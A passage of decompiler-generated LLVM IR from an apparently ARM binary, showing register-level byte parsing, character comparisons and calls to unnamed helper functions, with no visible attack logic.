dec_label_pc_94e8:                                ; preds = %dec_label_pc_94d0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9514

dec_label_pc_94f0:                                ; preds = %dec_label_pc_9514
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_94f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94f4, i32* %r3.global-to-local, align 4
  %v0_94f8 = load i32, i32* @sl, align 4
  %v1_94f8 = add i32 %v0_94f8, 16
  %v2_94f8 = inttoptr i32 %v1_94f8 to i32*
  %v3_94f8 = load i32, i32* %v2_94f8, align 4
  %v1_94fc = add i32 %v3_94f4, 1
  store i32 %v1_94fc, i32* %ip.global-to-local, align 4
  %v3_9500 = icmp uge i32 %v3_94f8, %v1_94fc
  store i1 %v3_9500, i1* %cpsr_c.global-to-local, align 1
  %v9_9500 = icmp eq i32 %v3_94f8, %v1_94fc
  store i1 %v9_9500, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_94fc, i32* %r1.global-to-local, align 4
  store i32 %v1_94fc, i32* %stack_var_-44, align 4
  %v7_9510 = icmp sgt i32 %v3_94f8, %v1_94fc
  %v0_9520.pre = load i32, i32* @r5, align 4
  br i1 %v7_9510, label %dec_label_pc_94f0.dec_label_pc_9514_crit_edge, label %dec_label_pc_9538

dec_label_pc_94f0.dec_label_pc_9514_crit_edge:    ; preds = %dec_label_pc_94f0
  %v0_9524.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9514

dec_label_pc_9514:                                ; preds = %dec_label_pc_94f0.dec_label_pc_9514_crit_edge, %dec_label_pc_94e8
  %v0_9524 = phi i32 [ %v0_9524.pre, %dec_label_pc_94f0.dec_label_pc_9514_crit_edge ], [ %v3_94ac, %dec_label_pc_94e8 ]
  %v0_9520 = phi i32 [ %v0_9520.pre, %dec_label_pc_94f0.dec_label_pc_9514_crit_edge ], [ %v0_948c, %dec_label_pc_94e8 ]
  %v0_9514 = phi i32 [ %v1_94fc, %dec_label_pc_94f0.dec_label_pc_9514_crit_edge ], [ 0, %dec_label_pc_94e8 ]
  %v1_9514 = and i32 %v0_9514, 33554432
  %v2_9514 = icmp ne i32 %v1_9514, 0
  store i1 %v2_9514, i1* %cpsr_c.global-to-local, align 1
  %v3_9514 = mul i32 %v0_9514, 128
  %v1_9518 = add i32 %v3_9514, 1472
  %v0_951c = load i32, i32* @sb, align 4
  %v2_951c = add i32 %v1_9518, %v0_951c
  store i32 %v2_951c, i32* %r1.global-to-local, align 4
  store i32 %v0_9520, i32* %r0.global-to-local, align 4
  store i32 %v0_9524, i32* %r2.global-to-local, align 4
  %v3_9528 = inttoptr i32 %v0_9520 to i8*
  %v4_9528 = call i32 @function_12790(i8* %v3_9528, i32 %v2_951c, i32 %v0_9524)
  store i32 %v4_9528, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_952c = icmp eq i32 %v4_9528, 0
  store i1 %v2_952c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_952c, label %dec_label_pc_94f0, label %dec_label_pc_94c8

dec_label_pc_9538:                                ; preds = %dec_label_pc_94f0, %dec_label_pc_94d0
  %v0_9538 = phi i32 [ %v0_948c, %dec_label_pc_94d0 ], [ %v0_9520.pre, %dec_label_pc_94f0 ]
  store i32 %v0_9538, i32* %r0.global-to-local, align 4
  %v1_953c = inttoptr i32 %v0_9538 to i8*
  %v2_953c = call i32 @function_12324(i8* %v1_953c)
  store i32 %v2_953c, i32* %r0.global-to-local, align 4
  %v2_9540 = icmp ugt i32 %v2_953c, 126
  store i1 %v2_9540, i1* %cpsr_c.global-to-local, align 1
  %v7_9540 = icmp eq i32 %v2_953c, 127
  store i1 %v7_9540, i1* %cpsr_z.global-to-local, align 1
  %v8_9544 = icmp sgt i32 %v2_953c, 127
  br i1 %v8_9544, label %dec_label_pc_94c8, label %dec_label_pc_9548

dec_label_pc_9548:                                ; preds = %dec_label_pc_9538
  %v0_9548 = load i32, i32* @sl, align 4
  %v1_9548 = add i32 %v0_9548, 16
  %v2_9548 = inttoptr i32 %v1_9548 to i32*
  %v3_9548 = load i32, i32* %v2_9548, align 4
  %v1_954c = and i32 %v3_9548, 33554432
  %v2_954c = icmp ne i32 %v1_954c, 0
  store i1 %v2_954c, i1* %cpsr_c.global-to-local, align 1
  %v3_954c = mul i32 %v3_9548, 128
  %v1_9550 = add i32 %v3_954c, 1472
  %v0_9554 = load i32, i32* @r5, align 4
  store i32 %v0_9554, i32* %r1.global-to-local, align 4
  %v0_9558 = load i32, i32* @sb, align 4
  %v2_9558 = add i32 %v1_9550, %v0_9558
  store i32 %v2_9558, i32* @r0, align 4
  %v2_955c = inttoptr i32 %v2_9558 to i8*
  %v3_955c = call i32 @function_1234c(i8* %v2_955c, i32 %v0_9554)
  store i32 %v3_955c, i32* %r0.global-to-local, align 4
  %v0_9560 = load i32, i32* @sl, align 4
  %v1_9560 = add i32 %v0_9560, 16
  %v2_9560 = inttoptr i32 %v1_9560 to i32*
  %v3_9560 = load i32, i32* %v2_9560, align 4
  %v0_9564 = load i32, i32* @r8, align 4
  store i32 %v0_9564, i32* @r5, align 4
  %v1_9568 = add i32 %v3_9560, 1
  store i32 %v1_9568, i32* %r3.global-to-local, align 4
  store i32 %v1_9568, i32* %v2_9560, align 4
  %v1_9388.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_937c

dec_label_pc_9574:                                ; preds = %dec_label_pc_859c
  store i32 %v1_859c, i32* %r3.global-to-local, align 4
  %v1_9578 = trunc i32 %v1_859c to i8
  store i8 %v1_9578, i8* %v2_85d4, align 1
  %v0_957c = load i32, i32* @r6, align 4
  %v1_957c = add i32 %v0_957c, -1452
  %v2_957c = inttoptr i32 %v1_957c to i32*
  %v3_957c = load i32, i32* %v2_957c, align 4
  store i32 %v3_957c, i32* @r0, align 4
  %v1_9580 = call i32 @function_15b20(i32 %v3_957c)
  store i32 %v1_9580, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9588 = load i32, i32* @r6, align 4
  %v2_9588 = add i32 %v1_9588, -1452
  %v3_9588 = inttoptr i32 %v2_9588 to i32*
  store i32 -1, i32* %v3_9588, align 4
  br label %dec_label_pc_85bc

dec_label_pc_9590:                                ; preds = %dec_label_pc_8d9c
  %v0_9590 = call i32 @function_12ecc()
  store i32 %v0_9590, i32* %r0.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_9598 = inttoptr i32 %v0_9590 to i32*
  store i32 104, i32* %v2_9598, align 4
  br label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %dec_label_pc_8dc8, %dec_label_pc_9590
  %v0_959c = call i32 @function_12ecc()
  store i32 %v0_959c, i32* %r0.global-to-local, align 4
  %v1_95a0 = inttoptr i32 %v0_959c to i32*
  %v2_95a0 = load i32, i32* %v1_95a0, align 4
  store i32 %v2_95a0, i32* %r3.global-to-local, align 4
  %v2_95a4 = icmp ugt i32 %v2_95a0, 10
  store i1 %v2_95a4, i1* %cpsr_c.global-to-local, align 1
  %v7_95a4 = icmp eq i32 %v2_95a0, 11
  store i1 %v7_95a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95a4, label %dec_label_pc_87b4, label %dec_label_pc_95ac

dec_label_pc_95ac:                                ; preds = %dec_label_pc_959c
  %v0_95ac = call i32 @function_12ecc()
  store i32 %v0_95ac, i32* %r0.global-to-local, align 4
  %v1_95b0 = inttoptr i32 %v0_95ac to i32*
  %v2_95b0 = load i32, i32* %v1_95b0, align 4
  store i32 %v2_95b0, i32* %r3.global-to-local, align 4
  %v2_95b4 = icmp ugt i32 %v2_95b0, 10
  store i1 %v2_95b4, i1* %cpsr_c.global-to-local, align 1
  %v7_95b4 = icmp eq i32 %v2_95b0, 11
  store i1 %v7_95b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95b4, label %dec_label_pc_87b4, label %dec_label_pc_95bc

dec_label_pc_95bc:                                ; preds = %dec_label_pc_8d24, %dec_label_pc_95ac, %dec_label_pc_9054
  %v0_95bc = load i32, i32* @sl, align 4
  %v1_95bc = add i32 %v0_95bc, -1452
  %v2_95bc = inttoptr i32 %v1_95bc to i32*
  %v3_95bc = load i32, i32* %v2_95bc, align 4
  store i32 %v3_95bc, i32* @r0, align 4
  %v1_95c0 = call i32 @function_15b20(i32 %v3_95bc)
  store i32 %v1_95c0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_95cc = load i32, i32* @sl, align 4
  %v2_95cc = add i32 %v1_95cc, -1452
  %v3_95cc = inttoptr i32 %v2_95cc to i32*
  store i32 -1, i32* %v3_95cc, align 4
  %v0_95d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_95d0 = trunc i32 %v0_95d0 to i8
  %v2_95d0 = load i32, i32* @sl, align 4
  %v3_95d0 = add i32 %v2_95d0, -1448
  %v4_95d0 = inttoptr i32 %v3_95d0 to i8*
  store i8 %v1_95d0, i8* %v4_95d0, align 1
  br label %dec_label_pc_87b4

dec_label_pc_95d8:                                ; preds = %dec_label_pc_93b4, %dec_label_pc_937c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_95e0 = call i32 @function_119d0(i32 38, i32* null)
  %v0_95e4 = load i32, i32* @fp, align 4
  store i32 %v0_95e4, i32* @r1, align 4
  store i32 %v3_95e0, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_95f0 = call i32 @function_12680(i8* %v3_829c, i32 %v0_95e4, i32 %v3_95e0)
  store i32 %v4_95f0, i32* %r0.global-to-local, align 4
  %v2_95f4 = icmp eq i32 %v4_95f0, -1
  store i1 %v2_95f4, i1* %cpsr_c.global-to-local, align 1
  %v7_95f4 = icmp eq i32 %v4_95f0, -1
  store i1 %v7_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95f4, label %dec_label_pc_9720, label %dec_label_pc_95fc

dec_label_pc_95fc:                                ; preds = %dec_label_pc_95d8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9604 = call i32 @function_119d0(i32 38, i32* null)
  %v0_9608 = load i32, i32* @fp, align 4
  store i32 %v0_9608, i32* @r1, align 4
  store i32 %v3_9604, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9614 = call i32 @function_12680(i8* %v3_829c, i32 %v0_9608, i32 %v3_9604)
  store i32 %v4_9614, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* @lr, align 4
  %v2_961c = add i32 %v4_9614, %v2_8278
  %v3_961c = inttoptr i32 %v2_961c to i8*
  %v4_961c = load i8, i8* %v3_961c, align 1
  %v2_9624 = icmp ugt i8 %v4_961c, 31
  store i1 %v2_9624, i1* %cpsr_c.global-to-local, align 1
  %v7_9624 = icmp eq i8 %v4_961c, 32
  store i1 %v7_9624, i1* %cpsr_z.global-to-local, align 1
  %v2_962c = zext i1 %v7_9624 to i32
  %v2_962c.v4_9614 = add i32 %v2_962c, %v4_9614
  store i32 %v2_962c.v4_9614, i32* @r4, align 4
  %v2_9630 = add i32 %v2_962c.v4_9614, %v2_8278
  store i32 %v2_9630, i32* @r5, align 4
  store i32 %v2_9630, i32* %r0.global-to-local, align 4
  %v1_9638 = load i32, i32* @fp, align 4
  %v2_9638 = sub i32 %v1_9638, %v2_962c.v4_9614
  store i32 %v2_9638, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9644 = call i32 @function_123dc(i32 %v2_9630, i32 %v2_9638, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2)
  store i32 %v5_9644, i32* %r0.global-to-local, align 4
  %v2_9648 = icmp eq i32 %v5_9644, -1
  store i1 %v2_9648, i1* %cpsr_c.global-to-local, align 1
  %v7_9648 = icmp eq i32 %v5_9644, -1
  store i1 %v7_9648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9648, label %dec_label_pc_9720, label %dec_label_pc_9650

dec_label_pc_9650:                                ; preds = %dec_label_pc_95fc
  %v2_9650 = icmp ne i32 %v5_9644, 0
  store i1 %v2_9650, i1* %cpsr_c.global-to-local, align 1
  %v7_9650 = icmp eq i32 %v5_9644, 1
  store i1 %v7_9650, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_865c, i32* %r2.global-to-local, align 4
  %v7_9658 = icmp slt i32 %v5_9644, 2
  br i1 %v7_9658, label %bb189, label %bb188

bb188:                                            ; preds = %dec_label_pc_9650
  %v9_9658 = add i32 %v5_9644, -2
  store i32 %v9_9658, i32* %r0.global-to-local, align 4
  br label %bb189

bb189:                                            ; preds = %dec_label_pc_9650, %bb188
  %v1_9660 = phi i32 [ %v5_9644, %dec_label_pc_9650 ], [ %v9_9658, %bb188 ]
  %v2_9660 = add i32 %v1_9660, %v2_86d8
  store i32 -20773, i32* @lr, align 4
  %v1_9668 = add i32 %v1_9660, 1
  store i32 %v1_9668, i32* @r6, align 4
  %v1_966c = load i32, i32* @r4, align 4
  %v2_966c = add i32 %v2_9660, %v1_966c
  store i32 %v2_966c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_9674 = load i32, i32* @r5, align 4
  store i32 %v0_9674, i32* %r0.global-to-local, align 4
  store i32 %v1_9668, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_197a4.42 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_9684 = add i32 %v2_966c, -20773
  %v5_9684 = inttoptr i32 %v4_9684 to i8*
  store i8 0, i8* %v5_9684, align 1
  %v5_9688 = call i32 @function_123dc(i32 %v0_9674, i32 %v1_9668, i32 ptrtoint ([5 x i8]* @global_var_197a4.42 to i32), i32 4)
  store i32 %v5_9688, i32* %r0.global-to-local, align 4
  %v2_968c = icmp ugt i32 %v5_9688, 3
  store i1 %v2_968c, i1* %cpsr_c.global-to-local, align 1
  %v7_968c = icmp eq i32 %v5_9688, 4
  store i1 %v7_968c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_968c, label %dec_label_pc_9a14, label %dec_label_pc_9694

dec_label_pc_9694:                                ; preds = %bb189
  store i32 %v2_8278, i32* %ip.global-to-local, align 4
  %v1_9698 = load i32, i32* @r4, align 4
  %v2_9698 = add i32 %v1_9698, %v2_8278
  %v3_9698 = inttoptr i32 %v2_9698 to i8*
  %v4_9698 = load i8, i8* %v3_9698, align 1
  %v6_9698 = zext i8 %v4_9698 to i32
  store i32 %v6_9698, i32* %r3.global-to-local, align 4
  %v2_969c = icmp ugt i8 %v4_9698, 46
  store i1 %v2_969c, i1* %cpsr_c.global-to-local, align 1
  %v7_969c = icmp eq i8 %v4_9698, 47
  store i1 %v7_969c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_969c, label %dec_label_pc_96a4, label %dec_label_pc_8d40

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9694
  %v0_96a4 = load i32, i32* @sb, align 4
  %v1_96a8 = add i32 %v0_96a4, 533
  store i32 %v1_96a8, i32* @r4, align 4
  store i32 %v1_96a8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_96b4 = call i32 @function_123b8(i32 %v1_96a8, i32 255)
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_96bc = load i32, i32* %stack_var_-44, align 4
  %v0_96c0 = load i32, i32* @r5, align 4
  %v1_96c0 = add i32 %v0_96c0, 1
  store i32 %v1_96c0, i32* @r5, align 4
  %v2_96c4 = add i32 %v1_96c0, %v3_96bc
  store i32 %v2_96c4, i32* %r0.global-to-local, align 4
  %v1_96c8 = inttoptr i32 %v2_96c4 to i8*
  %v2_96c8 = call i32 @function_12324(i8* %v1_96c8)
  store i32 %v2_96c8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_96cc = icmp eq i32 %v2_96c8, 0
  store i1 %v2_96cc, i1* %cpsr_z.global-to-local, align 1
  %tmp190 = icmp slt i32 %v2_96c8, 1
  br i1 %tmp190, label %dec_label_pc_8d40, label %dec_label_pc_96d4

dec_label_pc_96d4:                                ; preds = %dec_label_pc_96a4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_96d8 = load i32, i32* %stack_var_-44, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  %v2_96dc = add i32 %v0_96dc, %v3_96d8
  store i32 %v2_96dc, i32* %r0.global-to-local, align 4
  %v1_96e0 = inttoptr i32 %v2_96dc to i8*
  %v2_96e0 = call i32 @function_12324(i8* %v1_96e0)
  store i32 %v2_96e0, i32* %r0.global-to-local, align 4
  %v2_96e4 = icmp ugt i32 %v2_96e0, 254
  store i1 %v2_96e4, i1* %cpsr_c.global-to-local, align 1
  %v7_96e4 = icmp eq i32 %v2_96e0, 255
  store i1 %v7_96e4, i1* %cpsr_z.global-to-local, align 1
  %v8_96e8 = icmp sgt i32 %v2_96e0, 255
  br i1 %v8_96e8, label %dec_label_pc_8d40, label %dec_label_pc_96ec

dec_label_pc_96ec:                                ; preds = %dec_label_pc_96d4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_96f0 = load i32, i32* %stack_var_-44, align 4
  %v0_96f4 = load i32, i32* @r4, align 4
  store i32 %v0_96f4, i32* @r0, align 4
  %v0_96f8 = load i32, i32* @r5, align 4
  %v2_96f8 = add i32 %v0_96f8, %v3_96f0
  store i32 %v2_96f8, i32* %r1.global-to-local, align 4
  %v2_96fc = inttoptr i32 %v0_96f4 to i8*
  %v3_96fc = call i32 @function_1234c(i8* %v2_96fc, i32 %v2_96f8)
  store i32 %v3_96fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d40

dec_label_pc_9704:                                ; preds = %dec_label_pc_8e20
  %v0_9704 = load i32, i32* %r3.global-to-local, align 4
  %v1_9704 = add i32 %v0_9704, 1
  store i32 %v1_9704, i32* %r3.global-to-local, align 4
  %v1_9708 = trunc i32 %v1_9704 to i8
  %v2_9708 = load i32, i32* @sl, align 4
  %v3_9708 = add i32 %v2_9708, -1448
  %v4_9708 = inttoptr i32 %v3_9708 to i8*
  store i8 %v1_9708, i8* %v4_9708, align 1
  br label %dec_label_pc_87b4

dec_label_pc_9710:                                ; preds = %dec_label_pc_8c34
  %v0_9710 = load i32, i32* @fp, align 4
  store i32 %v0_9710, i32* @r0, align 4
  %v0_9714 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_9714, i32* %r1.global-to-local, align 4
  %v2_9718 = inttoptr i32 %v0_9710 to i8*
  %v3_9718 = call i32 @function_1234c(i8* %v2_9718, i32 %v0_9714)
  store i32 %v3_9718, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c4c

dec_label_pc_9720:                                ; preds = %dec_label_pc_95fc, %dec_label_pc_95d8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_9728 = call i32 @function_119d0(i32 37, i32* null)
  %v0_972c = load i32, i32* @fp, align 4
  store i32 %v0_972c, i32* @r1, align 4
  store i32 %v3_9728, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9738 = call i32 @function_12680(i8* %v3_829c, i32 %v0_972c, i32 %v3_9728)
  store i32 %v4_9738, i32* %r0.global-to-local, align 4
  %v2_9740 = icmp eq i32 %v4_9738, -1
  store i1 %v2_9740, i1* %cpsr_c.global-to-local, align 1
  %v7_9740 = icmp eq i32 %v4_9738, -1
  store i1 %v7_9740, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9740, label %dec_label_pc_993c, label %dec_label_pc_974c

dec_label_pc_974c:                                ; preds = %dec_label_pc_9720
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_9754 = call i32 @function_119d0(i32 37, i32* null)
  %v0_9758 = load i32, i32* @fp, align 4
  store i32 %v0_9758, i32* @r1, align 4
  store i32 %v3_9754, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9764 = call i32 @function_12680(i8* %v3_829c, i32 %v0_9758, i32 %v3_9754)
  store i32 %v4_9764, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* %ip.global-to-local, align 4
  %v2_976c = add i32 %v4_9764, %v2_8278
  %v3_976c = inttoptr i32 %v2_976c to i8*
  %v4_976c = load i8, i8* %v3_976c, align 1
  store i32 %v2_8278, i32* @lr, align 4
  %v2_9774 = icmp ugt i8 %v4_976c, 31
  store i1 %v2_9774, i1* %cpsr_c.global-to-local, align 1
  %v7_9774 = icmp eq i8 %v4_976c, 32
  store i1 %v7_9774, i1* %cpsr_z.global-to-local, align 1
  %v2_977c = zext i1 %v7_9774 to i32
  %v2_977c.v4_9764 = add i32 %v2_977c, %v4_9764
  store i32 %v2_977c.v4_9764, i32* @r4, align 4
  %v2_9780 = add i32 %v2_977c.v4_9764, %v2_8278
  store i32 %v2_9780, i32* @r5, align 4
  store i32 %v2_9780, i32* %r0.global-to-local, align 4
  %v1_9788 = load i32, i32* @fp, align 4
  %v2_9788 = sub i32 %v1_9788, %v2_977c.v4_9764
  store i32 %v2_9788, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9794 = call i32 @function_123dc(i32 %v2_9780, i32 %v2_9788, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2)
  store i32 %v5_9794, i32* %r0.global-to-local, align 4
  %v2_9798 = icmp eq i32 %v5_9794, -1
  store i1 %v2_9798, i1* %cpsr_c.global-to-local, align 1
  %v7_9798 = icmp eq i32 %v5_9794, -1
  store i1 %v7_9798, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9794, i32* @r7, align 4
  br i1 %v7_9798, label %dec_label_pc_993c, label %dec_label_pc_97a4

dec_label_pc_97a4:                                ; preds = %dec_label_pc_974c
  %v2_97a4 = icmp ne i32 %v5_9794, 0
  store i1 %v2_97a4, i1* %cpsr_c.global-to-local, align 1
  %v7_97a4 = icmp eq i32 %v5_9794, 1
  store i1 %v7_97a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_865c, i32* %r1.global-to-local, align 4
  %v7_97ac = icmp slt i32 %v5_9794, 2
  br i1 %v7_97ac, label %bb192, label %bb191

bb191:                                            ; preds = %dec_label_pc_97a4
  %v9_97ac = add i32 %v5_9794, -2
  store i32 %v9_97ac, i32* @r7, align 4
  br label %bb192

bb192:                                            ; preds = %dec_label_pc_97a4, %bb191
  %v1_97b4 = phi i32 [ %v5_9794, %dec_label_pc_97a4 ], [ %v9_97ac, %bb191 ]
  store i32 %v2_86d8, i32* %r1.global-to-local, align 4
  %v2_97b4 = add i32 %v1_97b4, %v2_86d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_97bc = load i32, i32* @r4, align 4
  %v2_97bc = add i32 %v2_97b4, %v1_97bc
  %v3_97c0 = load i32, i32* @r6, align 4
  %v4_97c0 = add i32 %v2_97bc, %v3_97c0
  %v5_97c0 = inttoptr i32 %v4_97c0 to i8*
  store i8 0, i8* %v5_97c0, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v0_97c8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_97c8, i32* %stack_var_-44, align 4
  store i32 %v2_8278, i32* %r3.global-to-local, align 4
  %v1_97d0 = load i32, i32* @r4, align 4
  %v2_97d0 = add i32 %v1_97d0, %v2_8278
  %v3_97d0 = inttoptr i32 %v2_97d0 to i8*
  %v4_97d0 = load i8, i8* %v3_97d0, align 1
  %v6_97d0 = zext i8 %v4_97d0 to i32
  store i32 %v6_97d0, i32* %r0.global-to-local, align 4
  %v1_97d4 = add nsw i32 %v6_97d0, -48
  store i32 %v1_97d4, i32* %r3.global-to-local, align 4
  %v2_97d8 = icmp ugt i32 %v1_97d4, 8
  store i1 %v2_97d8, i1* %cpsr_c.global-to-local, align 1
  %v7_97d8 = icmp eq i32 %v1_97d4, 9
  store i1 %v7_97d8, i1* %cpsr_z.global-to-local, align 1
  %v2_97dc = xor i1 %v7_97d8, true
  %v3_97dc = and i1 %v2_97d8, %v2_97dc
  br i1 %v3_97dc, label %.thread105, label %dec_label_pc_97e4

.thread105:                                       ; preds = %bb192
  %v4_97dc = load i32, i32* @r5, align 4
  store i32 %v4_97dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_980c

dec_label_pc_97e4:                                ; preds = %bb192
  %v1_97f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_97e8

dec_label_pc_97e8:                                ; preds = %dec_label_pc_97e8, %dec_label_pc_97e4
  %v0_97e8 = phi i32 [ %v1_9800, %dec_label_pc_97e8 ], [ 1, %dec_label_pc_97e4 ]
  store i32 %v0_97e8, i32* %ip.global-to-local, align 4
  store i32 %v0_97e8, i32* %stack_var_-44, align 4
  %v2_97f4 = add i32 %v0_97e8, %v1_97f4.pre
  %v3_97f4 = inttoptr i32 %v2_97f4 to i8*
  %v4_97f4 = load i8, i8* %v3_97f4, align 1
  %v6_97f4 = zext i8 %v4_97f4 to i32
  store i32 %v6_97f4, i32* %r0.global-to-local, align 4
  %v1_97f8 = add nsw i32 %v6_97f4, -48
  store i32 %v1_97f8, i32* %r3.global-to-local, align 4
  %v2_97fc = icmp ugt i32 %v1_97f8, 8
  store i1 %v2_97fc, i1* %cpsr_c.global-to-local, align 1
  %v7_97fc = icmp eq i32 %v1_97f8, 9
  store i1 %v7_97fc, i1* %cpsr_z.global-to-local, align 1
  %v1_9800 = add i32 %v0_97e8, 1
  store i32 %v1_9800, i32* @lr, align 4
  store i32 %v2_97f4, i32* %r1.global-to-local, align 4
  %v2_9808 = xor i1 %v2_97fc, true
  %v3_9808 = or i1 %v7_97fc, %v2_9808
  br i1 %v3_9808, label %dec_label_pc_97e8, label %dec_label_pc_980c

dec_label_pc_980c:                                ; preds = %dec_label_pc_97e8, %.thread105
  %v2_9818 = phi i32 [ %v4_97dc, %.thread105 ], [ %v2_97f4, %dec_label_pc_97e8 ]
  %v0_980c = phi i32 [ %v6_97d0, %.thread105 ], [ %v6_97f4, %dec_label_pc_97e8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_980c = icmp eq i32 %v0_980c, 0
  store i1 %v2_980c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_980c, label %dec_label_pc_993c, label %dec_label_pc_9814

dec_label_pc_9814:                                ; preds = %dec_label_pc_980c
  store i32 0, i32* @r6, align 4
  %v3_9818 = inttoptr i32 %v2_9818 to i8*
  store i8 0, i8* %v3_9818, align 1
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9820 = load i32, i32* %stack_var_-44, align 4
  %v1_9824 = add i32 %v3_9820, 1
  store i32 %v1_9824, i32* %ip.global-to-local, align 4
  store i32 %v1_9824, i32* %stack_var_-44, align 4
  %v0_982c = load i32, i32* @r5, align 4
  %v2_982c = add i32 %v0_982c, %v1_9824
  %v3_982c = inttoptr i32 %v2_982c to i8*
  %v4_982c = load i8, i8* %v3_982c, align 1
  %v6_982c = zext i8 %v4_982c to i32
  store i32 %v6_982c, i32* %r3.global-to-local, align 4
  %v2_9830 = icmp ugt i8 %v4_982c, 31
  store i1 %v2_9830, i1* %cpsr_c.global-to-local, align 1
  %v7_9830 = icmp eq i8 %v4_982c, 32
  store i1 %v7_9830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9830, label %bb193, label %.thread31

.thread31:                                        ; preds = %dec_label_pc_9814
  store i32 %v2_982c, i32* @r4, align 4
  br label %bb194

bb193:                                            ; preds = %dec_label_pc_9814
  %v2_9834 = add i32 %v3_9820, 2
  store i32 %v2_9834, i32* %ip.global-to-local, align 4
  %v2_9838 = add i32 %v0_982c, %v2_9834
  store i32 %v2_9838, i32* @r4, align 4
  store i32 %v2_9834, i32* %stack_var_-44, align 4
  br label %bb194

bb194:                                            ; preds = %.thread31, %bb193
  %v0_9840 = phi i32 [ %v2_982c, %.thread31 ], [ %v2_9838, %bb193 ]
  store i32 %v0_9840, i32* %r0.global-to-local, align 4
  %v1_9844 = inttoptr i32 %v0_9840 to i8*
  %v2_9844 = call i32 @function_12324(i8* %v1_9844)
  store i32 ptrtoint ([5 x i8]* @global_var_197ac.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9844, i32* @r1, align 4
  %v0_9850 = load i32, i32* @r4, align 4
  store i32 %v0_9850, i32* %r0.global-to-local, align 4
  %v4_9854 = inttoptr i32 %v0_9850 to i8*
  %v5_9854 = call i32 @function_12680(i8* %v4_9854, i32 %v2_9844, i32 ptrtoint ([5 x i8]* @global_var_197ac.44 to i32))
  store i32 %v5_9854, i32* %r0.global-to-local, align 4
  %v2_9858 = icmp eq i32 %v5_9854, -1
  store i1 %v2_9858, i1* %cpsr_c.global-to-local, align 1
  %v7_9858 = icmp eq i32 %v5_9854, -1
  store i1 %v7_9858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9858, label %.thread35, label %dec_label_pc_9868

.thread35:                                        ; preds = %bb194
  store i32 %v10_82f0, i32* @lr, align 4
